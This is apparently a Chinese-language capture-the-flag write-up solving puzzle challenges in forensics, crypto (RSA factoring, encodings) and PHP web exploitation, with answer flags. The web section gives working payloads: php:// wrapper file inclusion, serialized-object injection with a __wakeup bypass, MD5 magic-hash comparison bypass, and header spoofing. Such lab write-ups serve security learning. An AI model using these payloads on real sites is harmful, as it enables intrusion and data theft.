### MISC

#### 摩丝

摩斯密码在线解密 

![image-20221120031022467](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120031022467.png)

flag{ILOVEYOU}

#### 认真你就输了

下载是个xls文件  改个后缀zip解压一下    直接找一下flag

![image-20221120031301868](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120031301868.png)

flag{M9eVfi2Pcs#}

#### 系统密码

一个pass.hash文件 拉kali  cat看一下

![image-20221120032020312](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120032020312.png)

MD5在线解密一下

![image-20221120032103169](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120032103169.png)

flag{good-luck}

#### ε=ε=ε=┏(゜ロ゜;)┛

一个图片 kali strings看一下

![image-20221120032448393](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120032448393.png)

题目说了  直接在线

![image-20221120032610791](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120032610791.png)

flag{koekj3s}

#### 眼见为假

010看了一下 zip伪加密

拉进kali   binwalk直接分离一下

![image-20221120035011075](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120035011075.png) ![image-20221120035038351](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120035038351.png)

flag{Adm1N-B2G-kU-SZIP}

#### PY

找了个脚本逆了一下

```python
import hashlib
for i in range(32,127):
    for j in range(32,127):
        for k in range(32,127):
           m = hashlib.md5()  #将m进行md5加密。
           s = 'TASC' + chr(i) + 'O3RJMV' + chr(j) + 'WDJKX' + chr(k) + 'ZM'
           m.update(s.encode("utf8")) #先将s编码在赋给m。
           des = m.hexdigest()  #返回摘要，作为十六进制数据字符串值。
           if 'e9032' in des and 'da' in des and '911513' in des:
              print(des)
              break


```

跑出来

![image-20221120041223530](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120041223530.png) 

flag{e9032994dabac08080091151380478a2}

#### Sqllibs

没写脚本

wireshark分析是sql盲注 根据正常回显  看一下导出特定分组解析结果 导出为.csv

用excell看   在wireshark中看过后  正常回显的长度为553

![image-20221120042654881](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120042654881.png) 在excell中搜553 拼接起来就是flag

flag{04e84d0a-b2df-4671-8cc4-1634b5acc352}

#### Trace the hacker!!!!

一个后门的流量包  过滤http包

![image-20221120043623498](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120043623498.png) 

![image-20221120043640456](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120043640456.png) 

![image-20221120043701855](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120043701855.png) 

这是回显内容   最后一个是flag.txt文本

在base64解密解不开  百度了一下

![image-20221120043903439](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120043903439.png)

是被压缩了一下  让后base64加密

找了个python脚本  用python2的zlib模块

```python
import base64, zlib
flag = 'eJxLy0lMrw6NTzPMS4n3TVWsBQAz4wXi'
zlib.decompress(flag.decode('base64'))
```

![image-20221120044348696](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120044348696.png) flag{U_f1nd_Me!}

#### 剧情大反转

一张图片 用010看一下 发现后面很熟悉

![image-20221120050710418](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120050710418.png)

后面是 压缩包16进制

![ ](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120051033061.png)

压缩包的文件头   就需要倒序一下

文件改为.txt

<img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120051544492.png" alt="image-20221120051544492" style="zoom:50%;" /> 

选中后面的压缩包编码  找个网站http://www.atoolbox.net/Tool.php?Id=831  文字倒叙

<img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120051855834.png" alt="image-20221120051855834" style="zoom:50%;" />

保存为另一个txt  打开010 导入16进制文本  在另存为zip文件

![image-20221120052142288](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120052142288.png)

![image-20221120052154863](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120052154863.png) 

里面就是flag   把图片镜像翻转一下

![image-20221120052251652](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120052251652.png) 

flag{99f0fd18f89e6b73f05c139b0a9e4c98}

### CRYPTO

#### 套娃

一步步解码就行

1.16进制转字符串   转出来是unicode编码

2.unicode转ascii码   转出来是base64

3.base64解出来是 ascii码

4.ascii转换为字符串就是flag

或者在线网站https://icyberchef.com/   解码必备

![image-20221120053232089](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120053232089.png)

flag{8ea44e39c914c5ddfbb9808c10033421}

#### 栅栏密码

png用winhex拉到最后就是一串编码

Z3QTO2dDmQyQWNmhxjN2UjMmhMTNwMjJZ2dzOyQTyNlNTMwdUDYhMDME

题目就是栅栏密码

放进工具跑

![image-20221120184236468](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120184236468.png)

第四个base64解密

![image-20221120184328211](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120184328211.png) flag{3644257ea4673a9e093663207f24008f}

#### Not only base??

先栅栏

![image-20221120054657220](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120054657220.png)

base32解码

![image-20221120054735032](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120054735032.png)

flag{9067b55a-2f3f-4ed8-9581-aaa208994802}

#### rsa

已知 n e c求明文m

用yafu把n分解为质因数

![image-20221120162540580](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120162540580.png)

贴个脚本

![image-20221120162614862](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120162614862.png)

```python
import gmpy2
from Crypto.Util.number import long_to_bytes
 
n= 703739435902178622788120837062252491867056043804038443493374414926110815100242619
e= 59159
c= 449590107303744450592771521828486744432324538211104865947743276969382998354463377
p1 = 782758164865345954251810941
p2 = 1108609086364627583447802163
p3 = 810971978554706690040814093
phi = (p1-1)*(p2-1)*(p3-1)  
d = gmpy2.invert(e, phi)  
m = pow(c, d, n)  
print （long_to_bytes(m) ）
```

flag{1e257b39a25c6a7c4d66e197}

### WEB

#### unserialize1

f12看一下源码

![image-20221120190045006](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120190045006.png)

分析一波  有三个变量：user,file,pass

1.   isset的意思是查看变量是否存在，即user不能为空。

2.file_get_contents是把整个文件读入字符串中，这里也就是把user这个变量（user显然要是一个文件）的内容以字符串的方式读出来并且要和“welcome to rizhao”完全相等

3.![image-20221120190242418](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120190242418.png)   满足1.2后file读取hint.php

使用php伪协议

当传进去的参数作为文件名变量去打开文件时，可以将参数php://传进，同时post方式传进去值作为文件内容，供php代码执行时当做文件内容读取

既 

![image-20221120190502540](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120190502540.png)

base64编码方式打印出来

![image-20221120190542722](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120190542722.png)

```php
<?php
class Flag{//flag.php
    public $file;
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
            return ("good");
        }
    }
}
?>
```

在读取一下 网页源码index.php

![image-20221120190808377](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120190808377.png)

解码后

```php
<!--
$user = $_GET["txt"];
$file = $_GET["file"];
$pass = $_GET["password"];

if(isset($user)&&(file_get_contents($user,'r')==="welcome to rizhao")){
    echo "hello admin!<br>";
    include($file); //hint.php  ->这里有提示奥
}else{
    echo "you are not admin ! ";
}
-->
<?php
$txt = $_GET["txt"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to rizhao")){
    echo "hello friend!<br>";
    if(preg_match("/flag/",$file)){
        echo "no flag";
        exit();
    }else{
        include($file);
        $password = unserialize($password);
        echo $password;
    }
}else{
    echo "you are not the number ! ";
}
?>
```

在读取一下flag.php

![image-20221120191042403](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120191042403.png)

![image-20221120191125810](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120191125810.png) 在index.php中看这个意思就是    file中包含‘flag’就会退出

![image-20221120191238815](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120191238815.png) 

这个else写到如果我的file不包含‘flag’，那么就会把那个文件包含进来，之后将password反序列化一下，并输出password的结果。

发现当Flag方法当做字符串执行时，会自动执行 __tostring 方法，方法中写了如果file文件存在，那么就输出file文件中的内容。我们要构造一个Flag类型的参数，并把这个参数传给password然后get进去。并且这个file的值要是hint.php（利用hint.php的函数）

```php
    <?php
    class Flag{
    public $file;
    }
    $a = new Flag();
    $a->file = "flag.php";
    $a = serialize($a);
    print_r($a);
    ?>
```

序列化后得到 

```
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} 
```

传入参数

![image-20221120192502180](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120192502180.png)

flag{de410cd917e34263aa304297fa5bc9c9}

#### 签到

#### 签到1

#### MD5

`parse_str()`函数

parse_str(string,array)

- string 必需。规定要解析的字符串。
- array 可选。规定存储变量的数组的名称。该参数指示变量将被存储到数组中。

 parse_str()中如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。

![](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120200832785.png)  

要求我们提交id,然后GET方式获取到参数值，再经过parse_str()函数进行解析，将键名转为变量名，键值转为变量值，然后要输出flag还有一层条件，a[0]的值不能等于240610708但是要与其经过md5加密之后的值相等，发现240610708加密之后是以0e开头的，所以只有a[0]的值加密之后能以0e开头，条件就成立，这是利用了md5的一个缺陷


payload  

?id=a[0]=s1836677006a

![image-20221120201234318](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120201234318.png)

#### easy unserialize

是一个简单的反序列化+绕过wakeup

用这段php代码构造反序列化的文本

```php
<?php
class CNSS
{
    public $username = 'admin';
    private $i_want2_say = 'rzpt';
    protected $password  = 'ctf';
}
$a = new CNSS();
echo serialize($a);
?>

```

![image-20221120203914850](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120203914850.png)

```
O:4:"CNSS":3:{s:8:"username";s:5:"admin";s:17:" CNSS i_want2_say";s:4:"rzpt";s:11:" * password";s:3:"ctf";}
```

private属性序列化的时候格式是%00类名%00成员名

protect属性序列化的时候格式是%00*%00成员名

将3改为4绕过wakeup 

payload为 

```
O:4:"CNSS":3:{s:8:"username";s:5:"admin";s:17:"%00CNSS%00i_want2_say";s:4:"rzpt";s:11:"%00*%00password";s:3:"ctf";}
```

<img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120204602828.png" alt="image-20221120204602828" style="zoom:50%;" />flag{d2a02979acbe4cc59e16c1e0a8795af1}

#### Xff访问限制

![image-20221120204908950](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120204908950.png)

burp抓包改请求头

![image-20221120205116998](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120205116998.png)

![image-20221120205810856](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120205810856.png)

#### Urlencode

![image-20221120210033760](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120210033760.png)

信息泄露    网站有备份源码

![image-20221120205951009](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120205951009.png)

下载下来一个  index.bak   打开是一个

![image-20221120210247945](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120210247945.png)

分析代码   id的输入值应为root

但是root必须进行url编码，由于浏览器会进行一次url解码，所以如果想要服务器端进行一次url解码，则必须对root进行两次url编码：

payload   ?id=%25%37%32%25%36%66%25%36%66%25%37%34

![image-20221120210731501](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120210731501.png)

##### php特征

分析一下源码

![image-20221120212200854](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120212200854.png) 

md5弱碰撞

![image-20221120212224096](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120212224096.png)

file_get_contents() 把整个文件读入一个字符串中

file_get_contents函数：读取文件内容

用伪协议写进去 内容flag  使之相同

![image-20221120212745356](C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20221120212745356.png)

